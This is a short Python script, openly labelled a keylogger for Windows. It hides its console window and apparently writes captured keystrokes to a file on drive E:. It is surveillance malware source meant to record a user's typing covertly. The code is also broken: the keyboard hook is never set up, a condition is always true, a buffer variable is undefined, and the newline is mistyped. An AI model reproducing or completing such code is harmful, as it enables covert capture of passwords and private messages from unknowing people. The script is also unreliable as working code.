# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8:
        with open(r'E:\output.txt', 'w') as f:
            keylogs = chr(event.Ascii) 
            if event.Ascii == 96: 
                keylogs = '/n'
                buffer += keylogs 
                f.write(buffer) 
                f.close() 
# create a hook manager object 

KeyDown = OnKeyboardEvent 
# set the hook 

# wait forever 
pythoncom.PumpMessages()
